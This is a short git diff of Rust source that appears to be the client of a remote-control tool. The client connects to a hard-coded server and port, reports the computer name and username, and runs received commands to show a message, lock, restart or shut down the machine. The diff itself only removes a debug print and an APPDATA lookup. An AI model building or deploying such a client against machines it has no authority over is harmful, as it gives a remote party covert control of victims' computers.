@@ -22,11 +22,9 @@ const SERVER : &str = "192.168.2.220";
 const PORT : &str = "5005";
 
 fn main() {
-    println!("Connecting to {}:{}", SERVER, PORT);
     match TcpStream::connect(format!("{}:{}", SERVER, PORT)) {
         Ok(mut stream) => {
             let computer_name = hostname::get().unwrap().into_string().unwrap().into_bytes();
-            let appdata_folder = std::env::var("APPDATA").unwrap();
             let username = whoami::username();
 
             let client_object = format!("{{\"computer_name\": \"{}\", \"username\": \"{}\"}}", String::from_utf8_lossy(&computer_name), username);
@@ -50,7 +48,7 @@ fn main() {
                                 stream.write_all("append".as_bytes()).unwrap();
                                 main();
                             }
-                            "message" => message::vb_box(&stream, appdata_folder.clone()),
+                            "message" => message::vb_box(&stream),
                             "lock" => lock::lock_computer(&stream),
                             "restart" => restart::restart_computer(&stream),
                             "shutdown" => shutdown::shutdown_computer(&stream),
